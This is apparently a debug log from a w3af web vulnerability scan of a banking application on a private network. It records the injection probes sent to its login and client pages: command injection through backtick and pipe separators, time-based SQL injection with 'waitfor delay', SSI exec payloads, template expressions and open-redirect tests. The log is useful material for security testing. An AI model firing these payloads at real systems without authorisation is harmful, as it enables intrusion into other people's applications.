[Fr 20 Nov 2015 21:33:27 CET - information] Enabling redos's dependency server_header
[Fr 20 Nov 2015 21:33:27 CET - information] Enabling dav's dependency allowed_methods
[Fr 20 Nov 2015 21:33:29 CET - information] Enabling frontpage's dependency frontpage_version
[Fr 20 Nov 2015 21:33:34 CET - debug] Called w3afCore.start()
[Fr 20 Nov 2015 21:33:34 CET - debug] Enabling _dns_cache()
[ Fr 20 Nov 2015 21:33:34 CET - Enabled plugins ] plugins
[ Fr 20 Nov 2015 21:33:34 CET - Enabled plugins ]     audit file_upload, eval, un_ssl, os_commanding, lfi, sqli, preg_replace, mx_injection, generic, format_string, websocket_hijacking, shell_shock, memcachei, ldapi, buffer_overflow, redos, global_redirect, xpath, cors_origin, htaccess_methods, dav, ssi, csrf, xss, ssl_certificate, xst, blind_sqli, phishing_vector, response_splitting, rfd, rfi, frontpage
[Fr 20 Nov 2015 21:49:00 CET - debug] (Test id: 140709600305104) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/client.php - parameter "action" for 3 seconds using <ExactDelay (fmt:Thread.sleep(%s);, delta:0, mult:1000)>, response wait time was: 0.050656080246 seconds.
[Fr 20 Nov 2015 21:49:00 CET - debug] POST http://192.168.2.130/InternetBanking/login.php with data: "username=Test01!&password=`ping -c 4 localhost`" returned HTTP code "200" (id=1306,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] (Test id: 140709199052496) 6.29785591364 > 0.0395290851593 > 2.96690489848
[Fr 20 Nov 2015 21:49:00 CET - debug] (Test id: 140709199052496) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/login.php - parameter "password" for 3 seconds using <Command (OS: unix, Separator: "`", Command: "`ping -c %s localhost`")>, response wait time was: 0.0395290851593 seconds.
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1307,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=historypdf returned HTTP code "200" (id=1308,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1309,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1310,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1311,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=historypdf returned HTTP code "200" (id=1312,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] POST http://192.168.2.130/InternetBanking/login.php with data: "username=Test01!&password=Test01!" returned HTTP code "302" (id=1313,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=1);waitfor delay '0:0:3'-- returned HTTP code "200" (id=1314,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] (Test id: 140709600631568) 6.16393268108 > 0.057480096817 > 2.98178525766
[Fr 20 Nov 2015 21:49:00 CET - debug] (Test id: 140709600631568) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/client.php - parameter "action" for 3 seconds using <ExactDelay (fmt:1);waitfor delay '0:0:%s'--, delta:0, mult:1)>, response wait time was: 0.057480096817 seconds.
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1315,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=historypdf returned HTTP code "200" (id=1316,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1317,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=Thread.Sleep(3000); returned HTTP code "200" (id=1318,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] (Test id: 140709600301136) 6.08120548725 > 0.0408220291138 > 2.99097716808
[Fr 20 Nov 2015 21:49:00 CET - debug] (Test id: 140709600301136) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/client.php - parameter "action" for 3 seconds using <ExactDelay (fmt:Thread.Sleep(%s);, delta:0, mult:1000)>, response wait time was: 0.0408220291138 seconds.
[Fr 20 Nov 2015 21:49:00 CET - debug] POST http://192.168.2.130/InternetBanking/login.php with data: "username=Test01!&password=Test01!" returned HTTP code "302" (id=1319,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] Created 2 mutants for "Method: GET | http://192.168.2.130/InternetBanking/client.php | Query string: (action)" (query string: 2)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=|ping -n 4 localhost returned HTTP code "200" (id=1320,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] (Test id: 140709193438416) 6.11400800943 > 0.0558779239655 > 2.9873324434
[Fr 20 Nov 2015 21:49:00 CET - debug] (Test id: 140709193438416) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/client.php - parameter "action" for 3 seconds using <Command (OS: windows, Separator: "|", Command: "|ping -n %s localhost")>, response wait time was: 0.0558779239655 seconds.
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1321,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] Created 2 mutants for "Method: GET | http://192.168.2.130/InternetBanking/client.php | Query string: (action)" (query string: 2)
[Fr 20 Nov 2015 21:49:01 CET - debug] Created 1 mutants for "Method: GET | http://192.168.2.130/InternetBanking/client.php | Query string: (action)" (query string: 1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=KbYTpeefTGssYidZAmfFYJBjxacxSNmbhaBOKypMyEzxuSVZYljwfABhnmZvUKFrF returned HTTP code "200" (id=1322,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=vxlGONQzivuNzxHSvLqNDtilHdKfDrszUkqihLzUDlDnVCedmbvbbElIoCZLuKGBdWFBmqCTyDkLdequvscpOqXyDmqsyMLPchSkKISuDKXhiYpbLVrOSGNuKSJSiVmjjpneviUYyHmxCftDpiMRQtrghcpBMWoLoGkvIwLTrALDsPHxYruxrsAxkNJTnYsMXpZhGiejBYnBYcdwIDwhCEoXBGYsePvhxaWiPMubMOQaCDWxHRjZZngNQiSfkPWNq returned HTTP code "200" (id=1323,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=xsvqQQkPZidbdPDwhxpoRbWirhKyRRXnYdmnhQNRSHfgKevkQeYoUIjMKjxITNSdicZrJbUnIGQMBKFHwiyxGaeLknZVQqDwHDDlaFuqboVQxUHZVVzpTZDoWLFDuHrzVYerlPqBuwCeNTnwQJWJWFyJWdzHOgGteBTTeYytqIScHnRaUefWxjdvjDuzqKopwVBaVgpNUeshTNOWfvXRWdGPcqdJpThqtWOIIJfLzhHrVdESWwLdEzGNdUzlPryTvHYuKrlNJVQixIQOfZKaAqZfhNTvnDZigwsgdEPzgmcuQuSeckiKcNMgQPpiVMvgYDbNeIwtzgqyjvOqypppIRwpeLnBetrPowXBAGDvTjGMDnccQIaZczoysMPEXJPcAFYEvtBXVKjkxqCnzAUHZwQphbxtJXbAOlzfDgeXSFpHIvDSFISUzOfFwNtNOUSmymwzPdaCsxHPntUcFwxrkTpJFHzjlzVlWEiBScljfZXPnwGWMPcnyVsgPPUnGWtGm returned HTTP code "200" (id=1324,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=TXDnAIAfKgClWkWOXUCVqbsfeQpTRUYiwZYVVOiGIAzkCYXGVFdtgjIIJPkMsScDPshYlUJvQcdUfnmlpbuqhqnFIEAhfCxzuLyiIdJifrFXWFUIENDuusmszsNeiBDIKJcumPqNiHhwvZyIjGrfaMmfOyBdFHnERWcyHKbxBJrlPoNFxxqmqQPxKkNVjYkRPJkOjoJoLMKCFDAZWdXoYDNhnRRhFvGhYfsQlOJsWLPRtDhoEuXgGtZbtgEjajRehjQngSCZSWnUicKtrmBcQZWdnkoINPXxhYqtvToTmEympGUKvnBhfenGbSdllTNQrQkdKLFCKUYadOLUTwgkBJYxcorObrxaFVjSUkYmRrvYwUuhiGlucVVvpypThxoKtZkvOBOVJZQtkFkfONWsdQuOhUxbXbYeqVgUOKBYZEOarJqqDFLiWSETdtEsQlbNMSgukPeuWaVZdbnswynDgXDxoYJdwzNKxZYhaLoofXbAWcqyljJxvNlSpNCMCxJVOqvCiaEHWeEhMuIgvlZlTZMcoyXeOzoTFQtcMqzoupcUapFplEFSFLhvbROQaFvfSxdshsSgPMjCvnXfOBRgzAmVyEvJLXGPnLESNgahHMCwAEKnIpDtvCfCKwhRcQEGRaIiWqJFDrZsXhOdkWwZqPFYuXqaJmeRgEVKjuserGSHrHFAUzsxaTpQVcDjVEoHBsZWMmrMrjcOmXPRjUEzgoNoRyUBaRIJqIDwYPJbURmKdxOEQBMprJdQbvRKrQFwatgroJvAwVOxDCLKYMUSQaviYVskWPFXVfQuFQeSneyFhSEYjikXmAfBrlpSotjVSYitpMACooWRONTjHsenDQdRFGfqYZeMsbkuYmbJzvlZBcKHkGHsvYvdefMzPMLSxprIPKveTgZPixIgsbpbOmxrFIhKiKWeTueCXwBPmCoNIXYpXWDyzRaPAHKIAUdoWQzesFJAosiLaJVHrCmwWPJpaBIbOmfjINWmgSoxSLsboAtrXulrZXDfVBlTgKgFD returned HTTP code "200" (id=1325,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=oeaoMJVyKdNoeCzVOUgonxYYLgoUqbLPOnAVSBLeQoFeXMYzTDCImRVSuAJFJQcNhJvVElvTeXWlnVguufeSPpDyyevmXuwuPThjpmFEvQrUkKPyPdYJaZPOLVMakLybPdNiUrzzoxRzkbEqTzsuRFjWYdcbsCiugXtDFUbyrZYKnIjbtZbKdTZMnHXLMPwWghyAoYqMIkLhALfuyAYJRqLzSYDHDsabZjbCQzQKSgwMLSyZqwHtJHZfqdYCuhpdeOXjsdQborRJpbGxabKNjbyoEGFDhbjPpyRVWxFULmKfmwBtpOPFXRJnQUILRZMKiomqTVZXHcBzpibVSKNfRcbQPfZMFyYqcYKwyVlJQyqzKsMdrLtOpNRVBebWwUKzWqOPTJlKfcmQbPIEQgNxwZWykWQImljEpctChOaNOCHsUJRxZPWxjQdJULnAVGGXAuRFSIYFIsdVTARmiWVNgjwxfoIqgNKvDZOkZDGByLURGVNKmtvFHxWOpAESaPzKiBapOLsmXmrdNZAteTGQvVsTxuIIxwdtABEFxWlQDmscaazqBSDNfadalQTVZCOupwinYFofpFmtLAWGWFLBzEDThCyNbkwXdyGrrmSqlxjBdVGiLeXWNCzwCcSKrprXuvFbXwsSVQjmXAuIgMKPgwfhYctPpYllPQaqMxdalUoOptXqUOmixnMmVjlhJfeupGWswzIiJaAGhYPlnKHPLniiwfgiqamqHmrlzqeLjHFMUOEUtkbQyUdVfygUggqNrGoYPaLReczJpEEwfKkjcjSFOZprhiQwpwKOxyihqzSJjLRsxLqIfwUYMiSPqlGLGAQUKPrPQIJGLeHGKBSEGsaXvTZNwVCaslCVtbnFHwbCTdeVDRrRxqQZZSbyISxjYFqeODXFIYDybbnMcdutVpDIzUhLgmrgDdTxdkTyFkKdXgwhVgxVlKcVZgmleEYuTugCbQZKewiKTALJESwaDDtbHaFOrGkVtOcbKWwqvvqXJNnHUklZSIAUbryTlfxGeLlQGCRcCwjXASvrmWmPGbInRcqpnCBbuiVsyISAnKqtOcEwvfkQXPmfDhoURZVIAtqHFBrTAjjphYPPXPjNZPEBVPRKpofqfBuVmwBoOCfAqqgWNxbSKYenvpSLHQkxCPdyaIJldMCciKjeTIJxSepcJNnjUFxLLbyyCcYkkjNmbzjDxnqPdPTJuNlwhdNOFbVNgBQUewedScfCfChmxLzdNmPZNQCLbgzmkYlcJEMWarCjzkAPwCvufENDRaQmToThMjkMizTYbIWxSliYoAIGszZIqsYWilPrRYqLJJuLufPoVRRngKeOCxxJPpzRdKrcszglIeCAfztWPkbpJdCQFwwWDEglaOLDaVlqTILeDDqlkbgVCgIqPgQfQvLGaCxyUyIWjUAZjBFSckVLUBavFbeJhDgDLIHCYzTEdKykptmdlmPAtHmHCGNQdYtbIruuJvUOkjEhWWzkoDNyeZClMetPSvUxoheqZAPiPENXLyWBlnbdXjGibyujKJKpzDOpBmpOlUNOIsZWZIZnufzYGFSoTckYNazMvbhixLsyekQpxgqOVwYlNdhcdbHSlFnHfXzpLULJSngPxhouSKwdiLGKTfqiSxanCSwJDGWLYLIFJgLyiJfrPYpVzHhuzuEWwPcEhApBDGFVLCwtlHfgbyrFHdcuAFgHjyYnRuzSTfpckSTfEsXouPJdfzxzQogdyjHgVygWOBIUHAVQTvcbZfSISvkxTMrrRguGCCecQeiIcboJpuOHhreCDpWOhQUOARwcgUXIQeOPhvcafGtWiALshjNreqSsdwGDVzUnYBQyyXShklHGxhSDSnqbhofaOrwnnIAOswTSAMIxgqInhHYFhUtRebIMsKUYcTNHzNpiiWvjWRGQEZfFXkzJtvfPJgUtlOpYHwmqqsZEoCAHpsWFzCUWGNGAlBWRPAsZpKlHtLGUuBCBGPfCLPpADAGyHUoxEBUyFrMzDuFvGimEWWqfzPVkHznbhPjuvqeyKMaYGwUoTGVHMbFhSynmj returned HTTP code "200" (id=1326,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] Created 1 mutants for "Method: GET | http://192.168.2.130/InternetBanking/client.php | Query string: (action)" (query string: 1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=historypdf returned HTTP code "200" (id=1327,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=http://www.w3af.org/ returned HTTP code "200" (id=1328,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1329,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=//w3af.org returned HTTP code "200" (id=1330,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=d'z"0 returned HTTP code "200" (id=1331,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] Created 6 mutants for "Method: GET | http://192.168.2.130/InternetBanking/client.php | Query string: (action)" (query string: 6)
[Fr 20 Nov 2015 21:49:01 CET - debug] http://192.168.2.130/InternetBanking/client.php is suitable for CSRF attack
[Fr 20 Nov 2015 21:49:01 CET - debug] Updating socket timeout for 192.168.2.130 from 0.914604127407 to 0.717172908783 seconds
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=<!-- returned HTTP code "200" (id=1332,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] Updating socket timeout for 192.168.2.130 from 0.914604127407 to 0.717172908783 seconds
[Fr 20 Nov 2015 21:49:01 CET - debug] Updating socket timeout for 192.168.2.130 from 0.914604127407 to 0.717172908783 seconds
[Fr 20 Nov 2015 21:49:01 CET - debug] Updating socket timeout for 192.168.2.130 from 0.914604127407 to 0.717172908783 seconds
[Fr 20 Nov 2015 21:49:01 CET - debug] Updating socket timeout for 192.168.2.130 from 0.914604127407 to 0.717172908783 seconds
[Fr 20 Nov 2015 21:49:01 CET - debug] POST http://192.168.2.130/InternetBanking/login.php with data: "username=Test01!&password=Test01!" returned HTTP code "302" (id=1333,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] Created 1 mutants for "Method: GET | http://192.168.2.130/InternetBanking/client.php | Query string: (action)" (query string: 1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=a)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/)/ returned HTTP code "200" (id=1334,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=1));waitfor delay '0:0:3'-- returned HTTP code "200" (id=1336,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1335,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] (Test id: 140709599961808) 6.14515739679 > 0.14097905159 > 2.98387140036
[Fr 20 Nov 2015 21:49:01 CET - debug] (Test id: 140709599961808) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/client.php - parameter "action" for 3 seconds using <ExactDelay (fmt:1));waitfor delay '0:0:%s'--, delta:0, mult:1)>, response wait time was: 0.14097905159 seconds.
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=historypdf returned HTTP code "200" (id=1338,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] POST http://192.168.2.130/InternetBanking/login.php with data: "username=Test01!&password=run ping -n 4 localhost" returned HTTP code "200" (id=1337,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] (Test id: 140709195275536) 6.28080922365 > 0.0855829715729 > 2.96879897515
[Fr 20 Nov 2015 21:49:01 CET - debug] (Test id: 140709195275536) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/login.php - parameter "password" for 3 seconds using <Command (OS: windows, Separator: "run ", Command: "run ping -n %s localhost")>, response wait time was: 0.0855829715729 seconds.
[Fr 20 Nov 2015 21:49:01 CET - debug] Created 4 mutants for "Method: GET | http://192.168.2.130/InternetBanking/client.php | Query string: (action)" (query string: 4)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=6b2gi</->6b2gi/*6b2gi"6b2gi6b2gi'6b2gi6b2gi`6b2gi6b2gi = returned HTTP code "200" (id=1339,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] Created 6 mutants for "Method: GET | http://192.168.2.130/InternetBanking/client.php | Query string: (action)" (query string: 6)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=<!--#exec cmd="echo -n 11183;echo -n 19549" --> returned HTTP code "200" (id=1340,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1341,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=<!--#set var="SEED_A" value="46779" --><!--#echo var="SEED_A" --><!--#set var="SEED_B" value="14229" --><!--#echo var="SEED_B" --> returned HTTP code "200" (id=1342,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=${84433 * 23225} returned HTTP code "200" (id=1343,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action={76576 * 22799} returned HTTP code "200" (id=1344,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action={math equation="x * y" x=36192 y=84294} returned HTTP code "200" (id=1345,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action={{17559 * 43158}} returned HTTP code "200" (id=1346,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1347,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=historypdf returned HTTP code "200" (id=1348,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1349,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1350,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=|ping -c 4 localhost returned HTTP code "200" (id=1351,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] (Test id: 140709193439184) 6.31871241331 > 0.033035993576 > 2.96458750963
[Fr 20 Nov 2015 21:49:01 CET - debug] (Test id: 140709193439184) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/client.php - parameter "action" for 3 seconds using <Command (OS: unix, Separator: "|", Command: "|ping -c %s localhost")>, response wait time was: 0.033035993576 seconds.
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1352,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1353,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=historypdf returned HTTP code "200" (id=1354,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=ping -n 4 localhost returned HTTP code "200" (id=1355,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] (Test id: 140709599756688) 6.21148341894 > 0.0279748439789 > 2.97650184234
[Fr 20 Nov 2015 21:49:01 CET - debug] (Test id: 140709599756688) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/client.php - parameter "action" for 3 seconds using <Command (OS: windows, Separator: "", Command: "ping -n %s localhost")>, response wait time was: 0.0279748439789 seconds.
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=historypdf returned HTTP code "200" (id=1356,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=1';waitfor delay '0:0:3'-- returned HTTP code "200" (id=1357,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:01 CET - debug] (Test id: 140709181925136) 6.15712219477 > 0.0413398742676 > 2.98254197836
